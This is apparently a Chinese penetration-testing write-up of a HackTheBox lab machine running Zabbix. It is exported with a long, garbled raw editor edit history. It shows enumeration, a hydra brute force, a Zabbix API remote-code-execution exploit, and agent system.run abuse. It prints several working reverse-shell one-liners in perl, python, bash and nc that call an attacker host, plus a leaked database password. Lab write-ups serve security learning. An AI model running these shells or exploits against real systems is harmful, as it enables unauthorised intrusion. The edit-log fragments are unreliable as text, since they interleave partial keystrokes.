(publickey).\n```\n拒绝密码连接，要么通过web获取到id_rsa通过私钥连接；要么web远程代码执行获得webshell，再提权。\n\n## web enumeration\n\n```\nwget http://10.10.10.108\n---\ngobuster -u http://10.10.10.108 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \n/zabbix (Status: 301)\n/server-status (Status: 403)\n\n---\nburp spider\nhttp://10.10.10.108/zabbix/history.php\nZabbix 3.0.21\n---\nZabbix 2.2 < 3.0.3 - API JSON-RPC Remote Code Execution \nsearchsploit -m exploits/php/webapps/39937.py\n1. 修改exp地址为http://10.10.10.108/zabbix\n2. 运行exp：  python 39937.py \n3. 运行出错，检查exp\n[zabbix_cmd]>>:  \nResult of last command:\nTraceback (most recent call last):\n  File \"39937.py\", line 55, in <module>\n    \"auth\" : auth['result'],\nKeyError: 'result'\n用户名密码Admin/zabbix可能是无效口令，尝试登陆后的确失败\n4. http://10.10.10.108/zabbix/api_jsonrpc.php该地址存在\n5. burp截包，尝试弱密码猜测\nname=Admin&password=zabbix&autologin=1&enter=Sign+in\n\nhydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/3000-pass.txt -f 10.10.10.108 http-post-form \"/zabbix/index.php:name=^USER^&password=^PASS^&autologin=1&enter=Sign+in:incorrect\"\n```\n---\nmsf 尝试exploit/unix/misc/zabbix_agent_exec\nip/端口10050,失败\n---\nZabbix Agent - 'net.tcp.listen' Command Injection (Metasploit) \nZabbix Server 2.4.X\n---\n[CVE-2016-10134](http://cvedetails.com/cve/cve-2016-10134)\n before 3.0.4 allows remote attackers to execute arbitrary SQL commands\nauxiliary/gather/zabbix_toggleids_sqli\n失败\n---\n\n发现一个登陆表单，searchsploit zabbix，常规操作\n\n## 10050 port\nhttp://10.10.10.108:10050\nsearchsploit zabbix\nZabbix Agent - 'net.tcp.listen' Command Injection (Metasploit) \n\nuse exploit/linux/misc/zabbix_server_exec\nuse exploit/unix/misc/zabbix_agent_exec\n\n---\n\n## writeup\nlog in as guest，在主页面发现了一个用户名Zipper，仔细查找网页内容，把zapper、Zipper、zipper添加到字典中进行爆破\n![14]($res/14.PNG)\n\n## 拿到服务器参数\n通过官网获得api使用方法：https://www.zabbix.com/documentation/3.0/manual/api\n\n通过api，查询到服务器参数，然后修改exp\n\n```\nsearchsploit -m exploits/hp/webapps/39937.py\n\nZABIX_ROOT = 'http://10.10.10.108/zabbix'\t### Zabbix IP-address\nlogin = 'zapper'\t\t### Zabbix login\npassword = 'zapper'\t### Zabbix password\nhostid = '10105'\t### Zabbix hostid\n\npython 39937.py 即可拿到webshell\n```\n![1]($res/1.PNG)\n\n```\n参考pentestmonkey的reverse shell\n\nperl -e 'use Socket;$i=\"10.10.14.10\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n---\npython -c 'import pty;pty.spawn(\"/bin/bash\")'\n反弹standard shell失败，没有找到python\n---\nSHELL=/bin/bash script -q /dev/null\n\n---\nfind / -name \"*.txt\" 2>/dev/null\n本意是查找user.txt\n\n结果显示了一个web的路径。\n/usr/share/zabbix/robots.txt\n\ncat /usr/share/zabbix/conf/zabbix.conf.php\n\n$DB['TYPE']     = 'MYSQL';\n$DB['SERVER']   = 'localhost';\n$DB['PORT']     = '0';\n$DB['DATABASE'] = 'zabbixdb';\n$DB['USER']     = 'zabbix';\n$DB['PASSWORD'] = 'f.YMeMd$pTbpY3-449';\n\nmysql -u zabbix -p \nf.YMeMd$pTbpY3-449     #输入密码\n页面提示\nERROR 1044 (42000): Access denied for user 'zabbix'@'localhost' to database 'f.YMeMd-449mysql'\n\n于是我们要连接zabbixdb的数据库，而不是f.YMeMd-449mysql\n```\n## 存在的漏洞\n```\nguest匿名登陆+信息泄露\n弱密码\nweb api可访问，用来爆破登陆口令\nweb版本漏洞\n```",[[1569892760842,["whale@Whale",[[-1,4123,"于是我们要连接zabbixdb的数据库，而不是f.YMeMd-449mysql"]],[4123,4162],[4123,4123]]],[1569892765167,["whale@Whale",[[1,4123,"连接失败"]],[4123,4123],[4127,4127]]],[1569892890256,["whale@Whale",[[1,0,"\n"]],[0,0],[1,1]]],[1569892890500,["whale@Whale",[[1,0,"\n"]],[1,1],[2,2]]],[1569892918772,["whale@Whale",[[1,0,"zipper docker容器渗透"]],[0,0],[17,17]]],[1569892924036,["whale@Whale",[[-1,14,"器"],[1,15,"b"]],[14,15],[14,15]]],[1569892924241,["whale@Whale",[[1,15,"a"]],[14,15],[14,16]]],[1569892924509,["whale@Whale",[[1,16,"'j"]],[14,16],[14,18]]],[1569892924620,["whale@Whale",[[1,18,"i"]],[14,18],[14,19]]],[1569892924992,["whale@Whale",[[-1,14,"ba'ji"],[1,19,"靶机"]],[14,19],[14,16]]],[1569892929486,["whale@Whale",[[-1,13,"容靶机"]],[16,16],[13,13]]],[1569892933086,["whale@Whale",[[1,13,"容器靶机"]],[13,13],[17,17]]],[1569892942970,["whale@Whale",[[1,21,"\n"]],[19,19],[20,20]]],[1569892943548,["whale@Whale",[[1,20,"--"]],[20,20],[22,22]]],[1569892944136,["whale@Whale",[[-1,20,"--"]],[22,22],[20,20]]],[1569892944358,["whale@Whale",[[-1,21,"\n"]],[20,20],[19,19]]],[1569892945916,["whale@Whale",[[1,21,"\n"]],[19,19],[20,20]]],[1569892946658,["whale@Whale",[[1,20,"==="]],[20,20],[23,23]]],[1569893073600,["whale@Whale",[[1,4153,"\n"]],[4152,4152],[4153,4153]]],[1569893073885,["whale@Whale",[[1,4154,"\n"]],[4153,4153],[4154,4154]]],[1569893074984,["whale@Whale",[[1,4154,"老师"]],[4154,4154],[4156,4156]]],[1569893075803,["whale@Whale",[[-1,4154,"老师"]],[4156,4156],[4154,4154]]],[1569893078897,["whale@Whale",[[1,4154,"ls -al /"]],[4154,4154],[4162,4162]]],[1569893134605,["whale@Whale",[[1,4148,"\n"]],[4146,4146],[4147,4147]]],[1569893135949,["whale@Whale",[[1,4147,"---"]],[4147,4147],[4150,4150]]],[1569893140545,["whale@Whale",[[1,4157,"---"]],[4157,4157],[4160,4160]]],[1569893142483,["whale@Whale",[[-1,4151,"\n"]],[4151,4151],[4150,4150]]],[1569893143329,["whale@Whale",[[-1,4147,"---"]],[4150,4150],[4147,4147]]],[1569893143566,["whale@Whale",[[-1,4147,"\n"]],[4147,4147],[4146,4146]]],[1569893161059,["whale@Whale",[[1,4165,"\n"]],[4164,4164],[4165,4165]]],[1569893164823,["whale@Whale",[[1,4165,"netstat -nr"]],[4165,4165],[4176,4176]]],[1569893165199,["whale@Whale",[[1,4177,"\n"]],[4176,4176],[4177,4177]]],[1569893715425,["whale@Whale",[[1,4165,"\n"]],[4164,4164],[4165,4165]]],[1569893717037,["whale@Whale",[[1,4165,"-rwxr-xr-x   1 root root    0 Sep 30 21:33 .dockerenv\r\n"]],[4165,4165],[4220,4220]]],[1569893722480,["whale@Whale",[[-1,4218,"\r"],[1,4220,"fa"]],[4219,4219],[4221,4221]]],[1569893723058,["whale@Whale",[[-1,4219,"fa"]],[4221,4221],[4219,4219]]],[1569893742481,["whale@Whale",[[1,4219,"发现一个docker目录，说明可能是虚拟机容器"]],[4219,4219],[4242,4242]]],[1569893744441,["whale@Whale",[[1,4243,"\n"]],[4242,4242],[4243,4243]]],[1569893745460,["whale@Whale",[[1,4243,"---"]],[4243,4243],[4246,4246]]],[1569893770883,["whale@Whale",[[1,4259,"Kernel IP routing table\r\nDestination     Gateway         Genmask         Flags   MSS Window  irtt Iface\r\n0.0.0.0         172.17.0.1      0.0.0.0         UG        0 0          0 eth0\r\n172.17.0.0      0.0.0.0         255.255.0.0     U         0 0          0 eth0\r\n"]],[4259,4259],[4522,4522]]],[1569893833451,[null,[[-1,4282,"\r"],[1,4283,"\n"],[-1,4362,"\r"],[1,4363,"\n"],[-1,4441,"\r"],[1,4442,"\n"],[-1,4520,"\r"],[1,4521,"\n"]],[4282,4282],[4522,4522]]],[1569893833451,[null,[[1,4282,"\r"],[-1,4282,"\n"],[1,4362,"\r"],[-1,4362,"\n"],[1,4441,"\r"],[-1,4441,"\n"],[1,4520,"\r"],[-1,4520,"\n"]],[4522,4522],[4282,4282]]],[1569893784092,["whale@Whale",[[-1,4282,"\r"],[-1,4362,"\r"],[-1,4441,"\r"],[-1,4520,"\r"],[1,4522,"查看路由表，"]],[4518,4518],[4524,4524]]],[1569893797099,["whale@Whale",[[-1,4523,"，"]],[4524,4524],[4523,4523]]],[1569893798700,["whale@Whale",[[1,4524,"\n"]],[4523,4523],[4524,4524]]],[1569893799480,["whale@Whale",[[1,4524,"---"]],[4524,4524],[4527,4527]]],[1569893799754,["whale@Whale",[[1,4528,"\n"]],[4527,4527],[4528,4528]]],[1569893809194,["whale@Whale",[[1,4528,"ifconfig，本地ip为17."]],[4528,4528],[4545,4545]]],[1569893809939,["whale@Whale",[[-1,4544,"."]],[4545,4545],[4544,4544]]],[1569893813387,["whale@Whale",[[1,4544,"2.17.0.1"]],[4544,4544],[4552,4552]]],[1569893813934,["whale@Whale",[[-1,4551,"1"]],[4552,4552],[4551,4551]]],[1569893814071,["whale@Whale",[[1,4551,"2"]],[4551,4551],[4552,4552]]],[1569893894532,["whale@Whale",[[1,4553,"\n"]],[4552,4552],[4553,4553]]],[1569893895898,["whale@Whale",[[1,4553,"---"]],[4553,4553],[4556,4556]]],[1569893896095,["whale@Whale",[[1,4557,"\n"]],[4556,4556],[4557,4557]]],[1569893915930,["whale@Whale",[[1,4557,"nc -nv 172.17.01"]],[4557,4557],[4573,4573]]],[1569893916697,["whale@Whale",[[-1,4572,"1"]],[4573,4573],[4572,4572]]],[1569893921765,["whale@Whale",[[1,4572,".1 10050"]],[4572,4572],[4580,4580]]],[1569893960897,["whale@Whale",[[1,4581,"\n"]],[4580,4580],[4581,4581]]],[1569893961564,["whale@Whale",[[1,4581,"y"]],[4581,4581],[4582,4582]]],[1569893962239,["whale@Whale",[[-1,4581,"y"]],[4582,4582],[4581,4581]]],[1569893990179,["whale@Whale",[[1,4581,"用nc扫描网关的的10050端口"]],[4581,4581],[4597,4597]]],[1569894551744,["whale@Whale",[[1,4661,"-远程代码执行"]],[4661,4661],[4668,4668]]],[1569894614221,["whale@Whale",[[1,2297,"\n"]],[2296,2296],[2297,2297]]],[1569894632578,["whale@Whale",[[-1,795,"\n"]],[795,795],[794,794]]],[1569894671026,["whale@Whale",[[1,2385,"\n"]],[2384,2384],[2385,2385]]],[1569894682534,["whale@Whale",[[1,2563,"\n"]],[2562,2562],[2563,2563]]],[1569895672115,["whale@Whale",[[1,4600,"\n"]],[4599,4599],[4600,4600]]],[1569895674076,["whale@Whale",[[1,4600,"$ echo system.run[ id ] | nc 172.17.0.1 10050"]],[4600,4600],[4645,4645]]],[1569895676350,["whale@Whale",[[1,4600,"\n"]],[4599,4599],[4600,4600]]],[1569895678075,["whale@Whale",[[1,4600,"---"]],[4600,4600],[4603,4603]]],[1569895680675,["whale@Whale",[[-1,4604,"$ "]],[4606,4606],[4604,4604]]],[1569895689747,["whale@Whale",[[1,4599,"，为open状态"]],[4599,4599],[4607,4607]]],[1569895722649,["whale@Whale",[[-1,4629,"id"]],[4631,4631],[4629,4629]]],[1569895724984,["whale@Whale",[[1,4629,"ifconfig"]],[4629,4629],[4637,4637]]],[1569895811942,["whale@Whale",[[1,4666,"\n"]],[4665,4665],[4666,4666]]],[1569895824731,["whale@Whale",[[1,4667,"![2]($res/2.PNG)\n\n"]],[4666,4666],[4684,4684]]],[1569895828702,["whale@Whale",[[-1,4666,"\n"]],[4666,4666],[4665,4665]]],[1569895829830,["whale@Whale",[[1,4662,"\n"]],[4662,4662],[4663,4663]]],[1569895831262,["whale@Whale",[[1,4662,"ton"]],[4662,4662],[4665,4665]]],[1569895831964,["whale@Whale",[[-1,4662,"ton"]],[4665,4665],[4662,4662]]],[1569895858550,["whale@Whale",[[1,4662,"通过zabbix server system.run的系统特性，可以进行命令执行"]],[4662,4662],[4702,4702]]],[1569895862199,["whale@Whale",[[1,4792,"\n"]],[4791,4791],[4792,4792]]],[1569895900348,["whale@Whale",[[1,4703,"\n"]],[4702,4702],[4703,4703]]],[1569895901411,["whale@Whale",[[1,4703,"zabbix-agent"]],[4703,4703],[4715,4715]]],[1569895903785,["whale@Whale",[[-1,4703,"zabbix-agent"]],[4715,4715],[4703,4703]]],[1569895908428,["whale@Whale",[[1,4778,"zabbix-agent"]],[4778,4778],[4790,4790]]],[1569895927136,["whale@Whale",[[1,4805,"zabbix-server system.run远程代码执行"]],[4805,4805],[4835,4835]]],[1569896444275,["whale@Whale",[[1,4703,"echo system.run[ ifconfig ] | nc 172.17.0.1 10050"]],[4703,4703],[4752,4752]]],[1569896448775,["whale@Whale",[[-1,4720,"ifconfig"]],[4720,4728],[4720,4720]]],[1569896452746,["whale@Whale",[[1,4720,"nc -l"]],[4720,4720],[4725,4725]]],[1569896453433,["whale@Whale",[[-1,4724,"l"]],[4725,4725],[4724,4724]]],[1569896462328,["whale@Whale",[[1,4724,"e /bin/bash 10.10.10"]],[4724,4724],[4744,4744]]],[1569896463077,["whale@Whale",[[-1,4743,"0"]],[4744,4744],[4743,4743]]],[1569896467028,["whale@Whale",[[1,4743,"4.10 1235"]],[4743,4743],[4752,4752]]],[1569896615115,["whale@Whale",[[1,4777,"\n"]],[4776,4776],[4777,4777]]],[1569896617911,["whale@Whale",[[1,4703,"\n"]],[4703,4703],[4704,4704]]],[1569896619481,["whale@Whale",[[1,4703,"---"]],[4703,4703],[4706,4706]]],[1569896622371,["whale@Whale",[[1,4782,"\n"]],[4780,4780],[4781,4781]]],[1569896623162,["whale@Whale",[[1,4781,"ti"]],[4781,4781],[4783,4783]]],[1569896623693,["whale@Whale",[[-1,4781,"ti"]],[4783,4783],[4781,4781]]],[1569896629368,["whale@Whale",[[1,4781,"提示没有-e"]],[4781,4781],[4787,4787]]],[1569896632167,["whale@Whale",[[-1,4783,"没有-e"]],[4787,4787],[4783,4783]]],[1569896637018,["whale@Whale",[[1,4783,"nc没有-e参数"]],[4783,4783],[4791,4791]]],[1569896637667,["whale@Whale",[[1,4793,"\n"]],[4791,4791],[4792,4792]]],[1569896638882,["whale@Whale",[[1,4792,"---"]],[4792,4792],[4795,4795]]],[1569896639110,["whale@Whale",[[1,4797,"\n"]],[4795,4795],[4796,4796]]],[1569896656677,["whale@Whale",[[1,4796,"perl -e 'use Socket;$i=\"10.10.14.10\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"]],[4796,4796],[5016,5016]]],[1569896664052,["whale@Whale",[[1,4796,"\n"]],[4795,4795],[4796,4796]]],[1569896665558,["whale@Whale",[[1,4796,"echo system.run[ nc -e /bin/bash 10.10.14.10 1235 ] | nc 172.17.0.1 10050"]],[4796,4796],[4869,4869]]],[1569896676383,["whale@Whale",[[-1,4813,"nc"],[1,4815,"perl"],[-1,4819,"/bin/bash "],[1,4829,"'use Socket;$i=\""],[-1,4840," 1235"],[1,4845,"\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"]],[4813,4845],[5033,5033]]],[1569896679349,["whale@Whale",[[-1,4856,"4"]],[4857,4857],[4856,4856]]],[1569896679890,["whale@Whale",[[1,4856,"5"]],[4856,4856],[4857,4857]]],[1569896770881,["whale@Whale",[[-1,5058,"perl -e 'use Socket;$i=\"10.10.14.10\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n"]],[5058,5279],[5058,5058]]],[1569896773135,["whale@Whale",[[1,5058,"提示ZBXD)ZBX_NOTSUPPORTEDInvalid item key format."]],[5058,5058],[5105,5105]]],[1569896773492,["whale@Whale",[[1,5106,"\n"]],[5105,5105],[5106,5106]]],[1569896774944,["whale@Whale",[[1,5106,"---"]],[5106,5106],[5109,5109]]],[1569896775168,["whale@Whale",[[1,5110,"\n"]],[5109,5109],[5110,5110]]],[1569896783339,["whale@Whale",[[1,5110,"echo system.run[ ifconfig ] | nc 172.17.0.1 10050"]],[5110,5110],[5159,5159]]],[1569896892870,["whale@Whale",[[-1,5127,"ifconfig"]],[5127,5134],[5127,5127]]],[1569896899884,["whale@Whale",[[1,5127,"whereis python"]],[5127,5127],[5141,5141]]],[1569896996435,["whale@Whale",[[1,5166,"\n"]],[5165,5165],[5166,5166]]],[1569896996640,["whale@Whale",[[1,5167,"\n"]],[5166,5166],[5167,5167]]],[1569896997665,["whale@Whale",[[1,5167,"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"]],[5167,5167],[5391,5391]]],[1569897004443,["whale@Whale",[[1,5166,"echo system.run[ whereis python ] | nc 172.17.0.1 10050"]],[5166,5166],[5221,5221]]],[1569897018965,["whale@Whale",[[-1,5183,"whereis python"],[1,5197,"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"]],[5183,5197],[5407,5407]]],[1569897025400,["whale@Whale",[[-1,5432,"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"]],[5432,5656],[5432,5432]]],[1569897028453,["whale@Whale",[[-1,5298,"4"]],[5299,5299],[5298,5298]]],[1569897029385,["whale@Whale",[[1,5298,"5"]],[5298,5298],[5299,5299]]],[1569897033765,["whale@Whale",[[-1,5288,"0.0.1"]],[5293,5293],[5288,5288]]],[1569897037949,["whale@Whale",[[1,5288,"10.14.10"]],[5288,5288],[5296,5296]]],[1569897080446,["whale@Whale",[[1,5183,"/usr/bin/python3.6 "]],[5166,5434],[5202,5202]]],[1569897084058,["whale@Whale",[[-1,5202,"python "]],[5202,5202],[5202,5202]]],[1569897116002,["whale@Whale",[[1,5448,"\n"]],[5447,5447],[5448,5448]]],[1569897117244,["whale@Whale",[[1,5448,"---"]],[5448,5448],[5451,5451]]],[1569897117565,["whale@Whale",[[1,5452,"\n"]],[5451,5451],[5452,5452]]],[1569897118730,["whale@Whale",[[1,5452,"echo system.run[ whereis python ] | nc 172.17.0.1 10050"]],[5452,5452],[5507,5507]]],[1569897123255,["whale@Whale",[[-1,5477,"python"]],[5477,5477],[5477,5477]]],[1569897124053,["whale@Whale",[[1,5477,"nc"]],[5477,5477],[5479,5479]]],[1569897146275,["whale@Whale",[[-1,5473,"eis nc"]],[5479,5479],[5473,5473]]],[1569897147400,["whale@Whale",[[-1,5469,"whe"]],[5472,5472],[5469,5469]]],[1569897148913,["whale@Whale",[[1,5469,"nc 1-"]],[5469,5469],[5474,5474]]],[1569897149270,["whale@Whale",[[-1,5473,"-"]],[5474,5474],[5473,5473]]],[1569897150093,["whale@Whale",[[1,5473,"01."]],[5473,5473],[5476,5476]]],[1569897150713,["whale@Whale",[[-1,5474,"1."]],[5476,5476],[5474,5474]]],[1569897154498,["whale@Whale",[[1,5474,".10.14.10 1235"]],[5474,5474],[5488,5488]]],[1569897326523,[null,[[-1,5488,"r"]],[5488,5488],[5488,5488]]],[1569897326523,[null,[[1,5488,"r"]],[5488,5488],[5488,5488]]],[1569897267038,["whale@Whale",[[1,5513,"\n"]],[5512,5512],[5513,5513]]],[1569897268218,["whale@Whale",[[1,5513,"---"]],[5513,5513],[5516,5516]]],[1569897268434,["whale@Whale",[[1,5517,"\n"]],[5516,5516],[5517,5517]]],[1569897269839,["whale@Whale",[[1,5517,"bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"]],[5517,5517],[5555,5555]]],[1569897276413,["whale@Whale",[[1,5513,"\n"]],[5512,5512],[5513,5513]]],[1569897276948,["whale@Whale",[[1,5513,"c"]],[5513,5513],[5514,5514]]],[1569897277551,["whale@Whale",[[-1,5513,"c"]],[5514,5514],[5513,5513]]],[1569897280372,["whale@Whale",[[1,5513,"成功连接"]],[5513,5513],[5517,5517]]],[1569897285470,["whale@Whale",[[1,5447,"连接失败"]],[5447,5447],[5451,5451]]],[1569897293630,["whale@Whale",[[1,5526,"\n"]],[5525,5525],[5526,5526]]],[1569897294447,["whale@Whale",[[1,5526,"echo system.run[ nc 10.10.14.10 1235 ] | nc 172.17.0.1 10050"]],[5526,5526],[5586,5586]]],[1569897303153,["whale@Whale",[[-1,5543,"nc "],[1,5546,"bash -i >& /dev/tcp/"],[-1,5549,"1"],[-1,5552,"14"],[1,5554,"0"],[1,5556,"/808"],[1,5558,"0>&"],[-1,5559,"235"]],[5543,5562],[5581,5581]]],[1569897306869,["whale@Whale",[[-1,5562,"/10."]],[5566,5566],[5562,5562]]],[1569897311072,["whale@Whale",[[1,5562,"/10.1"]],[5562,5562],[5567,5567]]],[1569897313529,["whale@Whale",[[-1,5567,"0.0.1"]],[5567,5567],[5567,5567]]],[1569897318185,["whale@Whale",[[1,5567,"0.14.10"]],[5567,5567],[5574,5574]]],[1569897321577,["whale@Whale",[[-1,5575,"8080"]],[5575,5575],[5575,5575]]],[1569897323450,["whale@Whale",[[1,5575,"1235"]],[5575,5575],[5579,5579]]],[1569897386517,[null,[[-1,5492,"r"],[1,5517,"\n"],[-1,5647,"\n"]],[5492,5492],[5647,5647]]],[1569897386518,[null,[[1,5492,"r"],[-1,5516,"\n"],[1,5647,"\n"]],[5647,5647],[5492,5492]]],[1569897368141,["whale@Whale",[[-1,5609,"bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"]],[5609,5647],[5609,5609]]],[1569897446514,[null,[[-1,5492,"r"],[1,5517,"\n"],[-1,5608,"\n"]],[5492,5492],[5608,5608]]],[1569897446514,[null,[[1,5492,"r"],[-1,5516,"\n"],[1,5608,"\n"]],[5608,5608],[5492,5492]]],[1569897390294,["whale@Whale",[[1,5543,"/inb/sh"]],[5543,5543],[5550,5550]]],[1569897393356,["whale@Whale",[[-1,5548,"shba"]],[5550,5550],[5548,5548]]],[1569897429011,["whale@Whale",[[1,5612,"echo system.run[ /bin/sh -i >& /dev/tcp/10.10.14.10/1235 0>&1 ] | nc 172.17.0.1 10050\r\n"]],[5526,5612],[5699,5699]]],[1569897433261,["whale@Whale",[[-1,5629,"/bin/sh -i >& /dev/tcp/10.10.14.10/1235 0>&1"],[1,5673,"l"],[-1,5697,"\r"]],[5629,5673],[5630,5630]]],[1569897434071,["whale@Whale",[[1,5630,"s -al"]],[5630,5630],[5635,5635]]],[1569897506514,[null,[[-1,5492,"r"],[1,5517,"\n"],[1,5544,"b"],[-1,5546,"b"],[-1,5659,"\n"]],[5492,5492],[5659,5659]]],[1569897506514,[null,[[1,5492,"r"],[-1,5516,"\n"],[-1,5544,"b"],[1,5547,"b"],[1,5659,"\n"]],[5659,5659],[5492,5492]]],[1569897489654,["whale@Whale",[[-1,5629,"ls -al"],[1,5635,"find / -name \"*.txt\" 2?"]],[5629,5635],[5652,5652]]],[1569897490387,["whale@Whale",[[-1,5651,"?"]],[5652,5652],[5651,5651]]],[1569897491920,["whale@Whale",[[1,5651,">1"]],[5651,5651],[5653,5653]]],[1569897566520,[null,[[-1,5492,"r"],[1,5517,"\n"],[1,5544,"b"],[-1,5546,"b"],[-1,5677,"\n"]],[5492,5492],[5677,5677]]],[1569897566520,[null,[[1,5492,"r"],[-1,5516,"\n"],[-1,5544,"b"],[1,5547,"b"],[1,5677,"\n"]],[5677,5677],[5492,5492]]],[1569897535365,["whale@Whale",[[1,5650," "],[-1,5652,"1"],[1,5653,"/dev/null"]],[5650,5653],[5662,5662]]],[1569897537685,["whale@Whale",[[-1,5650," "]],[5650,5650],[5649,5649]]],[1569897626523,[null,[[-1,5492,"r"],[1,5517,"\n"],[1,5544,"b"],[-1,5546,"b"],[-1,5685,"\n"]],[5492,5492],[5685,5685]]],[1569897626523,[null,[[1,5492,"r"],[-1,5516,"\n"],[-1,5544,"b"],[1,5547,"b"],[1,5685,"\n"]],[5685,5685],[5492,5492]]],[1569897568117,["whale@Whale",[[-1,5643,"*"]],[5644,5644],[5643,5643]]],[1569897569387,["whale@Whale",[[1,5643,"user"]],[5643,5643],[5647,5647]]],[1569897618190,["whale@Whale",[[-1,5629,"find / -name \"user.txt\" 2>/dev/null"]],[5629,5664],[5629,5629]]],[1569897619575,["whale@Whale",[[1,5629,"whoami"]],[5629,5629],[5635,5635]]],[1569897686526,[null,[[-1,5492,"r"],[1,5517,"\n"],[1,5544,"b"],[-1,5546,"b"],[-1,5659,"\n"]],[5492,5492],[5659,5659]]],[1569897686526,[null,[[1,5492,"r"],[-1,5516,"\n"],[-1,5544,"b"],[1,5547,"b"],[1,5659,"\n"]],[5659,5659],[5492,5492]]],[1569897656966,["whale@Whale",[[1,5660,"ZBXDzabbix$"]],[5660,5660],[5671,5671]]],[1569897658471,["whale@Whale",[[-1,5670,"$"]],[5671,5671],[5670,5670]]],[1569897664322,["whale@Whale",[[1,5660,"whoami | "]],[5660,5660],[5669,5669]]],[1569897667667,["whale@Whale",[[1,5680,"\n"]],[5679,5679],[5680,5680]]],[1569897685902,["whale@Whale",[[-1,5629,"whoami"]],[5629,5629],[5629,5629]]],[1569897746528,[null,[[-1,5492,"r"],[1,5517,"\n"],[1,5544,"b"],[-1,5546,"b"],[-1,5673,"\n"]],[5492,5492],[5673,5673]]],[1569897746528,[null,[[1,5492,"r"],[-1,5516,"\n"],[-1,5544,"b"],[1,5547,"b"],[1,5673,"\n"]],[5673,5673],[5492,5492]]],[1569897689761,["whale@Whale",[[1,5629,"echo $0"]],[5629,5629],[5636,5636]]],[1569897736369,["whale@Whale",[[1,5681,"ZBXD/bin/sh"]],[5681,5681],[5692,5692]]],[1569897743278,["whale@Whale",[[1,5681,"echo $0 |  "]],[5681,5681],[5692,5692]]],[1569897806581,[null,[[-1,5492,"r"],[1,5517,"\n"],[1,5544,"b"],[-1,5546,"b"],[-1,5703,"\n"]],[5492,5492],[5703,5703]]],[1569897806581,[null,[[1,5492,"r"],[-1,5516,"\n"],[-1,5544,"b"],[1,5547,"b"],[1,5703,"\n"]],[5703,5703],[5492,5492]]],[1569897747577,["whale@Whale",[[1,5704,"\n"]],[5703,5703],[5704,5704]]],[1569897795131,["whale@Whale",[[1,5447,"\n"]],[5446,5446],[5447,5447]]],[1569897797352,["whale@Whale",[[1,5447,"ZBXD)ZBX_NOTSUPPORTEDInvalid item key format."]],[5447,5447],[5492,5492]]],[1569897800515,["whale@Whale",[[1,5447,"\n"]],[5447,5447],[5448,5448]]],[1569897866528,[null,[[-1,5539,"r"],[1,5564,"\n"],[1,5591,"b"],[-1,5593,"b"],[-1,5750,"\n"]],[5539,5539],[5750,5750]]],[1569897866528,[null,[[1,5539,"r"],[-1,5563,"\n"],[-1,5591,"b"],[1,5594,"b"],[1,5750,"\n"]],[5750,5750],[5539,5539]]],[1569897858029,["whale@Whale",[[-1,5676,"echo $0"],[1,5683,"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f"]],[5676,5683],[5751,5751]]],[1569897866364,["whale@Whale",[[-1,5732,"1.0.0."]],[5732,5738],[5732,5732]]],[1569897926527,[null,[[-1,5539,"r"],[1,5564,"\n"],[1,5591,"b"],[-1,5593,"b"],[-1,5812,"\n"]],[5539,5539],[5812,5812]]],[1569897926527,[null,[[1,5539,"r"],[-1,5563,"\n"],[-1,5591,"b"],[1,5594,"b"],[1,5812,"\n"]],[5812,5812],[5539,5539]]],[1569897869856,["whale@Whale",[[1,5732,".10.14.10"]],[5732,5732],[5741,5741]]],[1569897871938,["whale@Whale",[[-1,5741," 1234"]],[5741,5741],[5741,5741]]],[1569897874134,["whale@Whale",[[1,5742," 1235"]],[5741,5741],[5746,5746]]],[1569897986529,[null,[[-1,5539,"r"],[1,5564,"\n"],[1,5591,"b"],[-1,5593,"b"],[-1,5742," "],[1,5747," "],[-1,5821,"\n"]],[5539,5539],[5821,5821]]],[1569897986529,[null,[[1,5539,"r"],[-1,5563,"\n"],[-1,5591,"b"],[1,5594,"b"],[1,5742," "],[-1,5746," "],[1,5821,"\n"]],[5821,5821],[5539,5539]]],[1569897937204,["whale@Whale",[[1,5779,"\n"]],[5779,5779],[5780,5780]]],[1569897937409,["whale@Whale",[[1,5780,"\n"]],[5780,5780],[5781,5781]]],[1569898046531,[null,[[-1,5539,"r"],[1,5564,"\n"],[1,5591,"b"],[-1,5593,"b"],[-1,5742," "],[1,5747," "],[-1,5823,"\n"]],[5539,5539],[5823,5823]]],[1569898046531,[null,[[1,5539,"r"],[-1,5563,"\n"],[-1,5591,"b"],[1,5594,"b"],[1,5742," "],[-1,5746," 